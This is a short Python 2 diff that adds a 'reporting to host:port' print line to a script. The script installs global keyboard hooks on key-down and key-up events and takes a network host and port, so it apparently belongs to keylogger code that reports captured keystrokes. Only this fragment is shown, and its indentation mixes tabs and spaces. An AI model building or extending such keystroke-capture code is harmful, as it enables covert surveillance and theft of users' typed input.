@@ -43,6 +43,7 @@ def OnKeyboardEvent(event):
 def main(script, port=6666, host="localhost"):
 	Host=host
         Port=int(port)
+        print "reporting to %s:%d" % (Host, Port)
 	hm=hooklib.HookManager()
 	hm.KeyDown = OnKeyboardEvent
 	hm.KeyUp = OnKeyboardEvent
